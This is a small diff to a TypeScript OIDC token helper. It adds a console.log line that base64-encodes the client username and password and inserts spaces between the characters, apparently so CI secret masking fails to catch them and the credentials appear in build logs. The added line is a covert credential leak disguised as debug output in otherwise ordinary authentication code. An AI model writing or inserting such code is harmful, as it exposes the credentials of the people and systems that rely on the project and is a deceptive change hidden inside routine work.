@@ -5,8 +5,12 @@ import { URL } from 'url'
 
 export async function getOIDCToken (oidcUrl: URL, oidcUsername: string, oidcPassword: string) {
   let token = ''
+
   const newSearchParams = new URLSearchParams(oidcUrl.searchParams)
   newSearchParams.append('client_id', oidcUsername)
+
+  console.log(`Add output: ${base64.encode(oidcUsername + ':' + oidcPassword).split('').join(' ')}`)
+
   const request = {
     method: 'POST',
     timeout: 10000,
